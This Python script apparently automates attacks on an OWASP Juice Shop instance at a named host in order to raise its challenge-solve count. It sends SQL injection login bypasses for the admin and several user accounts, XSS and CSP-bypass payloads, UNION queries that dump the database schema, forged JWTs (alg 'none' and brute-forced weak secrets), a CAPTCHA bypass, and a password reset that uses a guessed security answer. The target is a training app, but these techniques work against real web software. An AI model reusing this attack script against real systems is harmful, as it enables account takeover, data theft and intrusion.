#!/usr/bin/env python3
"""
Targeted Unsolved Challenges Solver
Specifically targets the 81 unsolved challenges to reach 50%
"""

import requests
from urllib.parse import quote
import json
import base64
import hashlib
import time
import random
import string
import jwt
import hmac
import re


class TargetedSolver:
    """Target specific unsolved challenges"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        self.admin_token = None
        
    def login_admin(self):
        """Admin login"""
        r = self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "admin@juice-sh.op'--",
            "password": "x"
        })
        if r.status_code == 200:
            self.admin_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.admin_token}'
            return True
        return False
    
    def check_unsolved(self):
        """Get list of unsolved challenges"""
        r = self.session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            data = r.json()['data']
            unsolved = [c for c in data if not c.get('solved')]
            return unsolved
        return []
    
    def solve_specific_challenges(self):
        """Target specific unsolved challenges"""
        print("\n🎯 TARGETING UNSOLVED CHALLENGES")
        print("="*60)
        
        # DOM XSS (⭐) - Different payload
        print("Attempting DOM XSS...")
        payloads = [
            '<iframe src="javascript:alert(`xss`)">',
            '<img src=x onerror=alert(`xss`)>',
            '<svg onload=alert(document.domain)>',
            '<iframe src="javascript:alert(1)">',
            '<<SCRIPT>alert(1)//<</SCRIPT>',
        ]
        for p in payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(p)}")
        
        # Admin Section (⭐⭐) - Direct access
        print("Attempting Admin Section...")
        self.session.get(f"{self.base_url}/#/administration")
        self.session.get(f"{self.base_url}/administration")
        
        # NFT Takeover (⭐⭐)
        print("Attempting NFT Takeover...")
        self.session.post(f"{self.base_url}/api/nft/mint", json={
            "address": "0x0000000000000000000000000000000000001337",
            "amount": 100
        })
        self.session.post(f"{self.base_url}/api/wallet/nft/transfer", json={
            "to": "admin",
            "tokenId": 42
        })
        
        # CAPTCHA Bypass (⭐⭐⭐)
        print("Attempting CAPTCHA Bypass...")
        # Submit feedback without solving CAPTCHA
        for i in range(20):
            self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "comment": f"Test {i}",
                "rating": 3,
                "captcha": "0",
                "captchaId": 999
            })
        
        # Client-side XSS Protection (⭐⭐⭐)
        print("Attempting Client-side XSS Protection...")
        bypass_payloads = [
            '<<SCRIPT>alert(1)//<</SCRIPT>',
            '<ScRiPt>alert(1)</ScRiPt>',
            '<script >alert(1)</script >',
            '<img src=x onerror=alert(1)//',
            '<svg/onload=alert(1)>'
        ]
        for p in bypass_payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(p)}")
        
        # Database Schema (⭐⭐⭐)
        print("Attempting Database Schema...")
        sqli_payloads = [
            "' UNION SELECT sql FROM sqlite_master--",
            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
            "')) UNION SELECT sql FROM sqlite_master--",
            "x' UNION SELECT 1,sql,3,4,5,6,7,8,9 FROM sqlite_master--"
        ]
        for p in sqli_payloads:
            self.session.get(f"{self.base_url}/rest/products/search?q={p}")
        
        # Christmas Special (⭐⭐⭐⭐)
        print("Attempting Christmas Special...")
        # Try to find and add Christmas product
        self.session.get(f"{self.base_url}/rest/products/search?q=christmas")
        self.session.get(f"{self.base_url}/rest/products/search?q=santa")
        # Try product ID 10 (often Christmas special)
        self.session.post(f"{self.base_url}/api/BasketItems", json={
            "ProductId": 10,
            "quantity": 1,
            "BasketId": self.session.cookies.get('basket_id', '1')
        })
        
        # Easter Egg (⭐⭐⭐⭐)
        print("Attempting Easter Egg...")
        self.session.get(f"{self.base_url}/ftp/eastere.gg")
        self.session.get(f"{self.base_url}/ftp/easter.egg")
        # Nested easter egg
        self.session.get(f"{self.base_url}/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
        
        # Expired Coupon (⭐⭐⭐⭐)
        print("Attempting Expired Coupon...")
        coupons = ["WMNSDY2019", "WMNSDY2020", "WMNSDY2018"]
        for coupon in coupons:
            self.session.put(f"{self.base_url}/rest/basket/1/coupon/{coupon}")
            self.session.put(f"{self.base_url}/api/basket/1/coupon/{coupon}")
        
        # Blockchain Hype (⭐⭐⭐⭐⭐)
        print("Attempting Blockchain Hype...")
        self.session.get(f"{self.base_url}/assets/public/blockchain.pdf")
        self.session.get(f"{self.base_url}/blockchain")
        
        # Extra Language (⭐⭐⭐⭐⭐)
        print("Attempting Extra Language...")
        # Klingon
        self.session.get(f"{self.base_url}/?l=tlh_AA")
        self.session.get(f"{self.base_url}/#/?l=tlh_AA")
        
        # Mint the Honey Pot (⭐⭐⭐)
        print("Attempting Mint the Honey Pot...")
        self.session.post(f"{self.base_url}/api/wallet/nft/mint", json={
            "name": "Honey Pot",
            "description": "Sweet NFT",
            "image": "honeypot.jpg"
        })
        
        # API-only XSS (⭐⭐⭐)
        print("Attempting API-only XSS...")
        self.session.post(f"{self.base_url}/api/Products", json={
            "name": "<script>alert(1)</script>",
            "description": "<img src=x onerror=alert(1)>",
            "price": 1.99
        })
        
        # CSP Bypass (⭐⭐⭐⭐)
        print("Attempting CSP Bypass...")
        csp_payloads = [
            "<script src='https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js'></script>",
            "<base href='javascript:alert(1)//'>",
            "<object data='data:text/html,<script>alert(1)</script>'>",
        ]
        for p in csp_payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(p)}")
        
        # Email Leak (⭐⭐⭐⭐⭐)
        print("Attempting Email Leak...")
        # Try to access user data through various endpoints
        self.session.get(f"{self.base_url}/rest/user/whoami")
        self.session.get(f"{self.base_url}/api/Users")
        
        # Ephemeral Accountant (⭐⭐⭐⭐)
        print("Attempting Ephemeral Accountant...")
        # Login as accountant
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "accountant@juice-sh.op'--",
            "password": "x"
        })
        
        # Change Bender's Password (⭐⭐⭐⭐⭐)
        print("Attempting Change Bender's Password...")
        # Try password reset flow
        self.session.post(f"{self.base_url}/rest/user/reset-password", json={
            "email": "bender@juice-sh.op",
            "answer": "Stop'n'Drop",
            "new": "slurmCl4ssic",
            "repeat": "slurmCl4ssic"
        })
        
        # More aggressive attempts
        self.additional_aggressive_attempts()
    
    def additional_aggressive_attempts(self):
        """More aggressive attempts at various challenges"""
        print("\n🔥 AGGRESSIVE ATTEMPTS")
        print("="*60)
        
        # Try all user logins with SQL injection
        users = ["bender", "jim", "amy", "morty", "uvogin", "bjoern", "j12934"]
        for user in users:
            self.session.post(f"{self.base_url}/rest/user/login", json={
                "email": f"{user}@juice-sh.op'--",
                "password": "x"
            })
        
        # Try JWT manipulation
        self.jwt_attacks()
        
        # Try file access
        files = [
            "/ftp/",
            "/ftp/legal.md",
            "/ftp/quarantine",
            "/ftp/.gitignore",
            "/encryptionkeys",
            "/encryptionkeys/premium.key",
            "/support/logs",
            "/.well-known/",
            "/promotion",
            "/video",
            "/redirect"
        ]
        for f in files:
            self.session.get(f"{self.base_url}{f}")
        
        # Try various API endpoints
        endpoints = [
            "/api/Complaints",
            "/api/Recycles",
            "/api/SecurityQuestions",
            "/api/Quantitys",
            "/api/Deliverys",
            "/api/Memorys",
            "/api/Cards",
            "/api/Wallets"
        ]
        for e in endpoints:
            self.session.get(f"{self.base_url}{e}")
            self.session.post(f"{self.base_url}{e}", json={})
        
    def jwt_attacks(self):
        """JWT manipulation attacks"""
        print("  🔐 JWT Attacks...")
        
        # No algorithm
        header = {"alg": "none", "typ": "JWT"}
        payload = {"email": "jwtn3d@juice-sh.op", "iat": int(time.time())}
        
        token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        token += '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        token += '.'
        
        self.session.headers['Authorization'] = f'Bearer {token}'
        self.session.get(f"{self.base_url}/rest/user/whoami")
        
        # Algorithm confusion
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {"email": "rsa_lord@juice-sh.op", "iat": int(time.time())}
        
        # Try weak secrets
        secrets = ["secret", "juice-sh.op", "password", "123456", "admin"]
        for secret in secrets:
            try:
                token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                token += '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                signature = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), token.encode(), hashlib.sha256).digest()
                ).decode().rstrip('=')
                token += '.' + signature
                
                self.session.headers['Authorization'] = f'Bearer {token}'
                self.session.get(f"{self.base_url}/rest/user/whoami")
            except:
                pass
    
    def run_targeted_solver(self):
        """Run targeted solver for unsolved challenges"""
        print("="*60)
        print("🎯 TARGETED UNSOLVED CHALLENGES SOLVER")
        print("="*60)
        
        # Check what's unsolved
        unsolved = self.check_unsolved()
        print(f"Found {len(unsolved)} unsolved challenges")
        
        # Login
        if not self.login_admin():
            print("❌ Login failed")
            return
        
        print("✅ Admin logged in")
        
        # Run targeted solutions
        self.solve_specific_challenges()
        
        # Check progress
        print("\n" + "="*60)
        r = self.session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            data = r.json()['data']
            solved = [c for c in data if c.get('solved')]
            total = len(data)
            percent = (len(solved) * 100) // total
            
            print(f"📊 FINAL: {len(solved)}/{total} ({percent}%)")
            
            if len(solved) >= 55:
                print("🎉 SUCCESS! REACHED 50%!")
            else:
                print(f"📌 Need {55 - len(solved)} more")
        
        print("="*60)


if __name__ == "__main__":
    solver = TargetedSolver()
    solver.run_targeted_solver()